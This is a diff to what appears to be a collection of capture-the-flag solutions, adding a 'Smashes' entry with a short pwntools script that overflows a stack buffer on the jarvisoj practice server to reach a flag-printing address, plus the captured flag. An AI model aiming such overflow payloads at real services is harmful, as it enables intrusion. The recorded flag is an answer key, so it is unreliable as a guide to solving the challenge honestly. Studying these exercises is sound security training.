@@ -302,6 +302,19 @@
    #CTF{332e294fb7aeeaf0e1c7703a29304343}
    ```
 
+* #### Smashes 
+
+   ```python
+   from pwn import *
+   r = remote('pwn.jarvisoj.com',9877)
+   flag_addr = 0x400d20
+   payload = 'a' * 0x218 + p64(flag_addr)
+   #payload = p64(0x400d21) * 1000
+   r.sendline(payload)
+   r.interactive()
+   #PCTF{57dErr_Smasher_good_work!}
+   ```
+
    
 
 * #### [XMAN]level0
